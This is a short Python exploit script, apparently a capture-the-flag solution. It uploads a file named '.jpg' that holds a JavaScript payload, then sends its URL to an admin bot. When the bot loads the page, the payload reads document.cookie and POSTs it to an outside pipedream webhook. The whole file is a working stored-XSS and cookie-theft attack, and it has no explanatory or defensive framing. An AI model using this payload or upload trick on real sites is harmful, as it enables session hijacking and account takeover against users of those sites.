import requests
import re
from pwn import context, log

context.log_level = "INFO"

URL = "https://uyw.hackthesystem.pro/"
BOT = "https://bot.uyw.hackthesystem.pro/"


def upload(filename, content, url=URL):
    res = requests.post(f"{url}/upload", files={
        "file": (filename, content),
    }, verify=False)
    return res.text


def get_folder_name(txt: str):
    txt = re.search(r"(?<=<p>Folder : ).*?(?=</p>)", txt, re.DOTALL).group(0)
    return txt

def send_to_bot(file_url, bot_url= BOT):
    requests.get(bot_url, params={"url":file_url})
    

if __name__ == "__main__":
    webhook = "https://eo9askyykvivacu.m.pipedream.net"
    filename = ".jpg"
    res = upload(filename, """
    <script>
        const headers = new Headers()
        headers.append("Content-Type", "application/json")

        const body = {
            "cookies": document.cookie
        }

        const options = {
            method: "POST",
            headers,
            mode: "cors",
            body: JSON.stringify(body),
        }

        fetch("%s", options)
    </script>
    """ % (webhook))
    folder_name = get_folder_name(res)
    log.info("folder name: %s", folder_name)
    file_url = f"{URL}/static/uploads/{folder_name}/{filename}"
    log.info("file url: %s", file_url)
    send_to_bot(file_url)
    log.success("Success!")